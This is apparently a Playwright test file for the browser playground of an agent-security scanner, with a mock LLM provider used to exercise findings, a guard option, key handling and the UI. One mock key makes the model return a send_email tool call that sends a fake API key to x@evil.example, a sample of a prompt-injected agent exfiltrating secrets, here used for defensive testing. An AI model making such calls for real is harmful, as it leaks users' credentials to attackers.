"""Browser end-to-end test for the playground (Playwright + Chromium).

Not part of the default `pytest` run (testpaths = tests). Run it explicitly:

    pip install pytest playwright && python -m playwright install chromium
    bash playground/build.sh
    pytest playground/e2e -v

It serves playground/ on a local port and starts a mock OpenAI-compatible provider, so no real
key is needed. Pyodide loads from the CDN unless a self-hosted copy exists in playground/pyodide/.
Set E2E_SCREENSHOTS=<dir> to save screenshots.
"""
import functools
import http.server
import json
import os
import re
import threading

import pytest

playwright_sync = pytest.importorskip("playwright.sync_api")

HERE = os.path.dirname(os.path.abspath(__file__))
SITE = os.path.dirname(HERE)
SHOTS = os.environ.get("E2E_SCREENSHOTS")
RUNTIME_TIMEOUT_MS = 180_000

if not os.path.exists(os.path.join(SITE, "vendor", "agentsec.whl")):
    pytest.skip("run `bash playground/build.sh` first", allow_module_level=True)


class _Static(http.server.SimpleHTTPRequestHandler):
    extensions_map = {**http.server.SimpleHTTPRequestHandler.extensions_map,
                      ".js": "text/javascript", ".mjs": "text/javascript", ".wasm": "application/wasm"}

    def log_message(self, *args):
        pass


class _MockProvider(http.server.BaseHTTPRequestHandler):
    """Key "good-safe" refuses, "good-obey" calls send_email, "bad" gets 401, "limited" gets 429.
    Paths under /nocors answer without CORS headers, like a provider that blocks browsers."""
    log = []

    def log_message(self, *args):
        pass

    def _cors(self):
        if not self.path.startswith("/nocors"):
            self.send_header("Access-Control-Allow-Origin", "*")
            self.send_header("Access-Control-Allow-Headers", "authorization, content-type, x-title")
            self.send_header("Access-Control-Expose-Headers", "retry-after")

    def do_OPTIONS(self):
        self.send_response(204)
        self._cors()
        self.end_headers()

    def _reply(self, status, obj, headers=None):
        body = json.dumps(obj).encode()
        self.send_response(status)
        self._cors()
        self.send_header("Content-Type", "application/json")
        for k, v in (headers or {}).items():
            self.send_header(k, v)
        self.send_header("Content-Length", str(len(body)))
        self.end_headers()
        self.wfile.write(body)

    def do_POST(self):
        data = json.loads(self.rfile.read(int(self.headers.get("Content-Length", 0))) or b"{}")
        key = self.headers.get("Authorization", "").replace("Bearer ", "")
        _MockProvider.log.append({"path": self.path, "key": key})
        if key == "bad":
            return self._reply(401, {"error": {"message": "Incorrect API key provided"}})
        if key == "limited":
            return self._reply(429, {"error": {"message": "Rate limit reached"}}, {"Retry-After": "20"})
        if key == "good-obey" and data["messages"][-1]["role"] == "user":
            call = {"id": "c1", "type": "function", "function": {
                "name": "send_email", "arguments": json.dumps({"to": "x@evil.example", "body": "sk-DEMO-FAKE-KEY-123"})}}
            return self._reply(200, {"choices": [{"message": {"content": None, "tool_calls": [call]}}],
                                     "usage": {"prompt_tokens": 50, "completion_tokens": 10}})
        return self._reply(200, {"choices": [{"message": {"content": "I can't help with that."}}],
                                 "usage": {"prompt_tokens": 40, "completion_tokens": 5}})


def _serve(handler):
    server = http.server.ThreadingHTTPServer(("127.0.0.1", 0), handler)
    threading.Thread(target=server.serve_forever, daemon=True).start()
    return server


@pytest.fixture(scope="module")
def site():
    server = _serve(functools.partial(_Static, directory=SITE))
    yield "http://127.0.0.1:%d/" % server.server_address[1]
    server.shutdown()


@pytest.fixture(scope="module")
def provider():
    server = _serve(_MockProvider)
    yield "http://127.0.0.1:%d" % server.server_address[1]
    server.shutdown()


@pytest.fixture(scope="module")
def browser():
    with playwright_sync.sync_playwright() as p:
        b = p.chromium.launch()
        yield b
        b.close()


def _open(browser, site, **ctx):
    context = browser.new_context(**ctx)
    context.grant_permissions(["clipboard-read", "clipboard-write"], origin=site.rstrip("/"))
    page = context.new_page()
    errors = []
    page.on("pageerror", lambda e: errors.append(str(e)))
    page.goto(site)
    playwright_sync.expect(page.locator("#runtime")).to_have_class("pill ready", timeout=RUNTIME_TIMEOUT_MS)
    return page, errors


def _shot(page, name):
    if SHOTS:
        os.makedirs(SHOTS, exist_ok=True)
        page.screenshot(path=os.path.join(SHOTS, name + ".png"), full_page=True)


def test_sample_mode_naive_then_hardened(browser, site):
    page, errors = _open(browser, site)
    expect = playwright_sync.expect
    expect(page.locator("#runtime-text")).to_contain_text("AgentSec")
    page.click("#run-sample")
    expect(page.locator("#verdict-num")).to_have_text("8")
    expect(page.locator("#sev-chips")).to_have_text("8 critical")
    expect(page.locator("details.finding")).to_have_count(8)
    expect(page.locator("#share-line")).to_contain_text("My agent resisted")
    # A card opens and shows severity, rule, input and evidence.
    first = page.locator("details.finding").first
    first.locator("summary").click()
    for label in ("Rule", "Input", "Evidence"):
        expect(first.locator("dt", has_text=re.compile("^%s$" % label))).to_be_visible()
    assert "sk-DEMO-FAKE-KEY-123" not in page.locator("#findings").inner_text()
    _shot(page, "1-naive")

    # Copy as Markdown and download JSON.
    page.click("#copy-md")
    expect(page.locator("#toast")).to_contain_text("Markdown copied")
    md = page.evaluate("navigator.clipboard.readText()")
    assert md.startswith("## Invaris AgentSec") and "8 findings" in md
    with page.expect_download() as dl:
        page.click("#download-json")
    report = json.loads(open(dl.value.path()).read())
    assert report["summary"]["findings"] == 8 and report["tool"]["name"] == "invaris-agentsec"

    page.check('input[name="variant"][value="hardened"]')
    page.click("#run-sample")
    expect(page.locator("#verdict-num")).to_have_text("0")
    expect(page.locator(".empty")).to_contain_text("No findings")
    expect(page.locator("#compare")).to_have_text("Naive: 8 critical → Hardened: 0 critical")
    _shot(page, "2-hardened")
    assert errors == []
    page.context.close()


def _llm(page, provider_url, key, guard=False, path="/v1"):
    page.click("#tab-llm")
    page.select_option("#provider", "custom")
    page.fill("#base-url", provider_url + path)
    page.fill("#model", "mock-model")
    page.fill("#api-key", key)
    page.set_checked("#guard", guard)
    page.click("#run-llm")


def test_llm_mode_findings_guard_and_key_handling(browser, site, provider):
    page, errors = _open(browser, site)
    expect = playwright_sync.expect
    _MockProvider.log.clear()
    _llm(page, provider, "good-obey")
    expect(page.locator("#verdict-num")).not_to_have_text("0", timeout=60_000)
    expect(page.locator("#verdict-label")).to_contain_text("mock-model")
    expect(page.locator("#partial-note")).to_contain_text("requests to the provider")
    assert int(page.locator("#verdict-num").inner_text()) > 0
    _shot(page, "3-llm-findings")
    assert _MockProvider.log and all(r["key"] == "good-obey" for r in _MockProvider.log)

    _llm(page, provider, "good-obey", guard=True)
    expect(page.locator("#verdict-label")).to_contain_text("guarded", timeout=60_000)
    expect(page.locator("#verdict-num")).to_have_text("0")

    # The key is never persisted.
    stored = page.evaluate("JSON.stringify(Object.assign({}, localStorage))")
    assert "good-obey" not in stored and "mock-model" in stored
    assert errors == []
    page.context.close()


@pytest.mark.parametrize("key,path,title,text", [
    ("bad", "/v1", "The API key was rejected", "401"),
    ("limited", "/v1", "Rate limited", "Retry after 20"),
    ("good-safe", "/nocors/v1", "Blocked by the browser (CORS)", "CORS"),
])
def test_llm_mode_errors(browser, site, provider, key, path, title, text):
    page, _ = _open(browser, site)
    expect = playwright_sync.expect
    _MockProvider.log.clear()
    _llm(page, provider, key, path=path)
    expect(page.locator("#error-title")).to_contain_text(title, timeout=60_000)
    expect(page.locator("#error-text")).to_contain_text(text)
    expect(page.locator("#run-llm")).to_be_enabled()
    expect(page.locator("#results")).to_be_hidden()
    expect(page.locator("#cancel-llm")).to_be_hidden()
    assert len(_MockProvider.log) <= 1  # stops after the first fatal error
    _shot(page, "4-error-" + key)
    page.context.close()


def test_phone_width_and_dark_mode(browser, site):
    page, _ = _open(browser, site, viewport={"width": 375, "height": 760}, color_scheme="dark",
                    device_scale_factor=2, is_mobile=True, has_touch=True)
    page.click("#run-sample")
    playwright_sync.expect(page.locator("#verdict-num")).to_have_text("8")
    page.locator("details.finding").first.locator("summary").click()
    overflow = page.evaluate("document.documentElement.scrollWidth - document.documentElement.clientWidth")
    assert overflow <= 0, "horizontal scroll at phone width"
    bg = page.evaluate("getComputedStyle(document.body).backgroundColor")
    assert bg == "rgb(14, 14, 20)"
    _shot(page, "5-phone-dark")
    page.click("#tab-llm")
    for hidden in ("#base-url-field", "#cancel-llm", "#progress"):
        playwright_sync.expect(page.locator(hidden)).to_be_hidden()
    _shot(page, "6-phone-dark-llm")
    page.click("#theme")  # auto -> light
    assert page.evaluate("getComputedStyle(document.body).backgroundColor") == "rgb(247, 247, 251)"
    page.context.close()
